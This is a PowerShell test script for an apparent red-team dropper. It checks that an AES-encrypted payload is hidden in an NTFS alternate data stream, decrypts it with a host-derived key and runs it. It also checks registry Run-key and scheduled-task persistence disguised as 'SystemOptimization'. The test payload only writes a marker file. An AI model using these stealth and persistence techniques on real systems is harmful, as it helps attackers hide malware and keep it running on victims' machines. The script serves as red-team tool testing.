# Test 3: Encrypted payloads with registry persistence
# Tests AES-256 encryption + registry Run key + companion task with JScript decryption wrapper
# Run as admin

$ErrorActionPreference = 'Continue'
$testName = "TEST-3: Encrypted payloads with registry persistence"
$marker = "C:\ProgramData\ads-test3-marker.txt"
$results = @{ Test = $testName; Pass = $true; Errors = @(); Details = @{} }

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host " $testName" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

# Cleanup prior artifacts
Remove-Item $marker -Force -EA SilentlyContinue
Unregister-ScheduledTask -TaskName "SystemOptimization" -Confirm:$false -EA SilentlyContinue
Unregister-ScheduledTask -TaskName "SystemOptimization_Companion" -Confirm:$false -EA SilentlyContinue
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemOptimization' -EA SilentlyContinue
Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemOptimization' -EA SilentlyContinue
Remove-Item "C:\ProgramData\SystemCache.dat" -Force -EA SilentlyContinue
Get-ChildItem "C:\ProgramData\syshealth_companion.js" -EA SilentlyContinue | Remove-Item -Force
Get-ChildItem "C:\ProgramData\windiag_*.js" -EA SilentlyContinue | Remove-Item -Force

$payload = "'Test3-Encrypted-Registry' | Out-File '$marker' -Force"

Write-Host "[1] Running ADS-Dropper with -Persist registry -Encrypt..." -ForegroundColor Yellow

try {
    & "C:\RedTeam\Apparition-Delivery-System-WithClaude-Snapshot1\Apparition-Delivery-System-WithClaude-Snapshot1\src\ADS-Dropper.ps1" `
        -Payload $payload `
        -Persist registry `
        -Encrypt `
        -NoExec `
        -Verbose 4>&1 | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
    Write-Host "[+] ADS-Dropper completed" -ForegroundColor Green
} catch {
    $results.Pass = $false
    $results.Errors += "ADS-Dropper execution failed: $_"
    Write-Host "[-] ADS-Dropper FAILED: $_" -ForegroundColor Red
}

# Step 2: Check ADS contains encrypted content (should be base64)
Write-Host "`n[2] Checking ADS creation (should be encrypted)..." -ForegroundColor Yellow
$adsPath = "C:\ProgramData\SystemCache.dat:payload"
try {
    $adsContent = Get-Content $adsPath -Raw -EA Stop
    Write-Host "[+] ADS exists with content ($($adsContent.Length) chars)" -ForegroundColor Green
    $results.Details['ADS_ContentLength'] = $adsContent.Length

    # Encrypted content should be base64 (not plaintext payload)
    if ($adsContent -match '^[A-Za-z0-9+/=\s]+$') {
        Write-Host "[+] Content appears to be base64 (encrypted)" -ForegroundColor Green
        $results.Details['IsEncrypted'] = $true
    } else {
        Write-Host "[?] Content may not be encrypted" -ForegroundColor Yellow
        Write-Host "    First 100 chars: $($adsContent.Substring(0, [Math]::Min(100, $adsContent.Length)))" -ForegroundColor DarkGray
    }

    # Verify it does NOT contain the plaintext payload
    if ($adsContent -notmatch 'Test3-Encrypted-Registry') {
        Write-Host "[+] Plaintext payload NOT visible in ADS (encrypted correctly)" -ForegroundColor Green
    } else {
        $results.Pass = $false
        $results.Errors += "Plaintext payload visible in ADS - encryption may have failed"
        Write-Host "[-] Plaintext visible in ADS!" -ForegroundColor Red
    }
} catch {
    $results.Pass = $false
    $results.Errors += "ADS not found: $_"
    Write-Host "[-] ADS NOT FOUND: $_" -ForegroundColor Red
}

# Step 3: Decrypt and verify payload round-trips correctly
Write-Host "`n[3] Decrypting ADS content to verify round-trip..." -ForegroundColor Yellow
try {
    # Use the same decryption functions from ADS-Dropper
    . "C:\RedTeam\Apparition-Delivery-System-WithClaude-Snapshot1\Apparition-Delivery-System-WithClaude-Snapshot1\src\ADS-Dropper.ps1" -Help 2>$null
    # The above fails but loads functions. Use inline approach:

    function Get-HostDerivedKey {
        $hostInfo = @(
            $env:COMPUTERNAME
            (Get-WmiObject Win32_ComputerSystemProduct -EA SilentlyContinue).UUID
            (Get-WmiObject Win32_BaseBoard -EA SilentlyContinue).SerialNumber
        ) -join '|'
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostInfo))
    }

    function Unprotect-Payload {
        param([string]$EncryptedData, [byte[]]$Key)
        $encryptedBytes = [Convert]::FromBase64String($EncryptedData)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $iv = $encryptedBytes[0..15]
        $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
        $aes.IV = $iv
        $decryptor = $aes.CreateDecryptor()
        $plainBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        return [System.Text.Encoding]::UTF8.GetString($plainBytes)
    }

    $key = Get-HostDerivedKey
    $decrypted = Unprotect-Payload -EncryptedData $adsContent.Trim() -Key $key
    Write-Host "[+] Decrypted payload: $decrypted" -ForegroundColor Green
    $results.Details['DecryptedPayload'] = $decrypted

    if ($decrypted -match 'Test3-Encrypted-Registry') {
        Write-Host "[+] Decrypted payload matches original" -ForegroundColor Green
    } else {
        $results.Pass = $false
        $results.Errors += "Decrypted payload doesn't match original"
        Write-Host "[-] Decrypted payload MISMATCH" -ForegroundColor Red
    }

    # Execute decrypted payload
    Invoke-Expression $decrypted
    if (Test-Path $marker) {
        Write-Host "[+] Decrypted payload executed successfully" -ForegroundColor Green
        Remove-Item $marker -Force
    } else {
        $results.Pass = $false
        $results.Errors += "Decrypted payload execution didn't create marker"
        Write-Host "[-] Decrypted payload execution failed" -ForegroundColor Red
    }
} catch {
    $results.Pass = $false
    $results.Errors += "Decryption failed: $_"
    Write-Host "[-] Decryption FAILED: $_" -ForegroundColor Red
}

# Step 4: Check registry Run key contains encryption functions
Write-Host "`n[4] Checking registry Run key for encryption functions..." -ForegroundColor Yellow
$hkcuRun = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$hkcuVal = (Get-ItemProperty -Path $hkcuRun -Name 'SystemOptimization' -EA SilentlyContinue).SystemOptimization
if ($hkcuVal) {
    Write-Host "[+] HKCU Run key exists ($($hkcuVal.Length) chars)" -ForegroundColor Green
    $results.Details['HKCU_ValueLength'] = $hkcuVal.Length

    # Check for encryption-related function names
    if ($hkcuVal -match 'GHK') {
        Write-Host "[+] Contains GHK (Get-HostKey) function" -ForegroundColor Green
    } else {
        $results.Errors += "Registry value missing GHK function"
        Write-Host "[-] Missing GHK function" -ForegroundColor Red
    }
    if ($hkcuVal -match 'Dec') {
        Write-Host "[+] Contains Dec (Decrypt) function" -ForegroundColor Green
    } else {
        $results.Errors += "Registry value missing Dec function"
        Write-Host "[-] Missing Dec function" -ForegroundColor Red
    }
    if ($hkcuVal -match 'FromBase64String') {
        Write-Host "[+] Contains Base64 decode" -ForegroundColor Green
    }

    Write-Host "    Registry command preview:" -ForegroundColor DarkGray
    Write-Host "    $($hkcuVal.Substring(0, [Math]::Min(300, $hkcuVal.Length)))..." -ForegroundColor DarkGray
} else {
    $results.Pass = $false
    $results.Errors += "HKCU Run key not found"
    Write-Host "[-] HKCU Run key NOT FOUND" -ForegroundColor Red
}

# Step 5: Check companion task JScript wrapper has decryption
Write-Host "`n[5] Checking companion JScript wrapper for decryption..." -ForegroundColor Yellow
$companionTask = Get-ScheduledTask -TaskName "SystemOptimization_Companion" -EA SilentlyContinue
if ($companionTask) {
    Write-Host "[+] Companion task exists" -ForegroundColor Green
    $compAction = $companionTask.Actions[0]
    if ($compAction.Arguments -match '"([^"]+\.js)"') {
        $jsPath = $Matches[1]
        if (Test-Path $jsPath) {
            $jsContent = Get-Content $jsPath -Raw
            Write-Host "[+] JScript wrapper: $jsPath ($($jsContent.Length) chars)" -ForegroundColor Green
            $results.Details['JScript_ContentLength'] = $jsContent.Length

            if ($jsContent -match 'Get-HostKey') {
                Write-Host "[+] JScript contains Get-HostKey function" -ForegroundColor Green
            } else {
                $results.Errors += "JScript missing Get-HostKey"
                Write-Host "[-] JScript missing Get-HostKey" -ForegroundColor Red
            }
            if ($jsContent -match 'Dec\(') {
                Write-Host "[+] JScript contains Dec function" -ForegroundColor Green
            } else {
                $results.Errors += "JScript missing Dec function"
                Write-Host "[-] JScript missing Dec" -ForegroundColor Red
            }
        }
    }
} else {
    $results.Pass = $false
    $results.Errors += "Companion task not found"
    Write-Host "[-] Companion task NOT FOUND" -ForegroundColor Red
}

# Step 6: Test the registry command execution (via cmd /c)
Write-Host "`n[6] Testing registry command execution..." -ForegroundColor Yellow
if ($hkcuVal) {
    try {
        # Run the registry command directly
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $hkcuVal" -Wait -NoNewWindow -EA Stop
        Start-Sleep -Seconds 2

        if (Test-Path $marker) {
            $markerContent = Get-Content $marker -Raw
            Write-Host "[+] Registry command executed successfully!" -ForegroundColor Green
            Write-Host "    Marker content: $($markerContent.Trim())" -ForegroundColor Green
            $results.Details['RegistryCmdExecuted'] = $true
        } else {
            # Might be timing issue — give it another second
            Start-Sleep -Seconds 2
            if (Test-Path $marker) {
                $markerContent = Get-Content $marker -Raw
                Write-Host "[+] Registry command executed (delayed)" -ForegroundColor Green
                $results.Details['RegistryCmdExecuted'] = $true
            } else {
                $results.Pass = $false
                $results.Errors += "Registry command execution didn't create marker"
                Write-Host "[-] Registry command execution FAILED to create marker" -ForegroundColor Red
            }
        }
    } catch {
        $results.Pass = $false
        $results.Errors += "Registry command execution error: $_"
        Write-Host "[-] Registry command execution ERROR: $_" -ForegroundColor Red
    }
}

# Summary
Write-Host "`n========================================" -ForegroundColor Cyan
if ($results.Pass) {
    Write-Host " RESULT: PASS" -ForegroundColor Green
} else {
    Write-Host " RESULT: FAIL" -ForegroundColor Red
    Write-Host " Errors:" -ForegroundColor Red
    $results.Errors | ForEach-Object { Write-Host "   - $_" -ForegroundColor Red }
}
Write-Host "========================================`n" -ForegroundColor Cyan

# Cleanup
Write-Host "[*] Cleaning up test artifacts..." -ForegroundColor DarkGray
Remove-Item $marker -Force -EA SilentlyContinue
Unregister-ScheduledTask -TaskName "SystemOptimization_Companion" -Confirm:$false -EA SilentlyContinue
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemOptimization' -EA SilentlyContinue
Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemOptimization' -EA SilentlyContinue
Remove-Item "C:\ProgramData\SystemCache.dat" -Force -EA SilentlyContinue
Get-ChildItem "C:\ProgramData\syshealth_companion.js" -EA SilentlyContinue | Remove-Item -Force
Get-ChildItem "C:\ProgramData\windiag_*.js" -EA SilentlyContinue | Remove-Item -Force

$results
